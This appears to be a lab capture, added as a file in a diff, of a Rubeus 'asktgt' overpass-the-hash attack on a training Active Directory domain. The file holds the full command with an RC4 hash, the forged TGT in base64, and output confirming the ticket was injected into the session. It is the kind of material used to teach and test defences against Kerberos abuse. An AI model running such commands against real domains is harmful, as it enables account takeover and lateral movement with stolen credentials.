@@ -1,0 +1,56 @@
+PS C:\tools> .\Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: c4b0e1b10c7ce2c4723b4e2407ef81a2
+[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.htb\john'
+[*] Using domain controller: 172.16.1.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIFiDCCBYSgAwIBBaEDAgEWooIEkjCCBI5hggSKMIIEhqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRC
+      oiYwJKADAgECoR0wGxsGa3JidGd0GxFpbmxhbmVmcmVpZ2h0Lmh0YqOCBEAwggQ8oAMCARKhAwIBAqKC
+      BC4EggQqPewTM44F2pZG7+WiIpUKYIJPRsI8QDoi/dZx4TzfN1JNdooUjAeXsSfIAARMF8d8vSash+ha
+      teMpFXV+j7GYIM49rXVXxDM93BdtFDwEhyI15QEka8gHrG14egZ7FWz65fv+t9N1eEIXSScDtVUeE4Ci
+      r8Wiefpt/b3BPppDBJub6ll/Y+cs2snCIo6rE0OuswWH8vMnUL4jWfAyQenaoE0I5wqePhz/H37Hfi4P
+      e6CGp1u/IW/6yTFmx7scS2B+EGfJXH9wHeGUo/rFmyuNpw4hZEHagFpYLc+t2irCtO2SHlOaWTUe20uO
+      zTEO5DU2S6IttzaqVhD7rcr7W8kN0ThFW6YoAspQNzZf+2rDrxoEWT1I2spISxw0ZPDJYfvQcexL/P6d
+      CjEXcHm6WO6mtsLTwdafljfnmfe3fxlhfCCBjaMzUSYUDgxD4RWhTYv1zJIcczUM+AHFjOWFtGOoCSCc
+      RBOEbDv9VrLw5ll5telkCT4TLLqFLFGQX6myytHnRU7TR6W1Z/DN4yOj4/BoWhnd3heQx0gm6LdSN+Gu
+      z5fE7vgyxwWu+GxbU57iM9Y77FKNoFntc2NiaOlEmHsemwivcc+UVBEfN3PKfu3EG0YOCjONv/XrUJjL
+      nJLavhtw2d/flzTJDeLODTFwb4kQ0ybz9i6ZSEX6wP8p5yUc5Hh7DzC3F8XCoToM9jcKVCTkfrHpWn2G
+      ej820KwtxSAtdKvLQ92MZQJrk5cS6tcKW/2C8y+KMv3SEoo1LlFXhZ8WSrnAlcKod9Xk4+JpjRqWOz4U
+      rbBubv6sfVUGu74Yo08G0CLSWmb44vRn65eO81tiwegKToaXSuHWoedYRxABcTlse96MbH7zeWBgtMDa
+      pes7NLm+GoX5A5TOtyFX9zYKh/C1jue9fh7GarPV/9oUAFO2DOAeqNjshAvlz82ywk1xFz2aV6nvug+E
+      q4hNxPIwAwV2FiLgvROJarRTAYX8vqlZZ0Cn4sJ5MW5hmi0LGGu0D9uVa0g7oUAgFQQdrYwLfRUMJExn
+      jf93uRtuDRv1mHD7rJk7r/ex2LLqCg+1VPcTho1tdhkw6XbTodw1nrCXJU2SjguD63zi5pSSQWKYDaVP
+      hw/kaQNjbYlAWaU8ToEOhFV5cjORqTQ4DjLOyWBQ6nFP98szUby09qMB79WKSaMpxE+hWiDZbXO4mNQs
+      706KtlcSyvyyJInq29yPaZ1xejyZT7OmfQPrjIOOdt8QUhXvWPQXl2H1Uk4lFnTk0pwJBz8P08F9i8db
+      Q4tA9Y83vtCHwk/gCZB8QtTrCApI83P685v12V1ySglcLDhL5bXS//M+QqfJ2Slc+AZRcZMPG7UbhJu3
+      LGt93cXiWIoYsi1xORaBZ9+bscQBtecgmZpsR2zUq6XYuy4YREQdXMDvr+6weU6/Zj/JQaOB4TCB3qAD
+      AgEAooHWBIHTfYHQMIHNoIHKMIHHMIHEoBswGaADAgEXoRIEEDWAGw6/S3ZkTDc1vksKnEWhExsRSU5M
+      QU5FRlJFSUdIVC5IVEKiETAPoAMCAQGhCDAGGwRqb2huowcDBQBA4QAApREYDzIwMjIxMjAxMjEwNTA2
+      WqYRGA8yMDIyMTIwMjA3MDUwNlqnERgPMjAyMjEyMDgyMTA1MDZaqBMbEUlOTEFORUZSRUlHSFQuSFRC
+      qSYwJKADAgECoR0wGxsGa3JidGd0GxFpbmxhbmVmcmVpZ2h0Lmh0Yg==
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/inlanefreight.htb
+  ServiceRealm             :  INLANEFREIGHT.HTB
+  UserName                 :  john
+  UserRealm                :  INLANEFREIGHT.HTB
+  StartTime                :  12/1/2022 3:05:06 PM
+  EndTime                  :  12/2/2022 1:05:06 AM
+  RenewTill                :  12/8/2022 3:05:06 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  NYAbDr9LdmRMNzW+SwqcRQ==
+  ASREP (key)              :  C4B0E1B10C7CE2C4723B4E2407EF81A2
